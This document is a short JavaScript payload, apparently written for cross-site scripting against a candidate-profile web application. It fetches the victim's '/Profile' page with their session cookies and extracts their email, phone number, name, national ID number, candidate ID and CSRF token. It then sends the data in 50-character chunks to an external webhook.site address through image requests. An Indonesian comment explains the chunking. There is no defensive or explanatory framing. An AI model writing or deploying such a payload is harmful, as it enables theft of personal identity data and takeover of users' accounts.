fetch('/Profile',{credentials:'include'})
  .then(r=>r.text())
  .then(d=>{
    var data={
      email:(d.match(/CanEmail":"([^"]+)"/)||[])[1]||'',
      phone:(d.match(/CanHandphone":"([^"]+)"/)||[])[1]||'',
      name:(d.match(/CanName":"([^"]+)"/)||[])[1]||'',
      nik:(d.match(/CardNumber":"([^"]+)"/)||[])[1]||'',
      canId:(d.match(/CanId":(\d+)/)||[])[1]||'',
      csrf:window._CSRFToken
    };
    var json = JSON.stringify(data);
    // Pecah jadi bagian 50 karakter, kirim banyak request
    for(let i=0;i<json.length;i+=50){
      new Image().src='https://webhook.site/9f46aacb-aa9f-4fcc-906c-47f898d3cb93?part='+i+'&d='+encodeURIComponent(json.substring(i,i+50));
    }
  })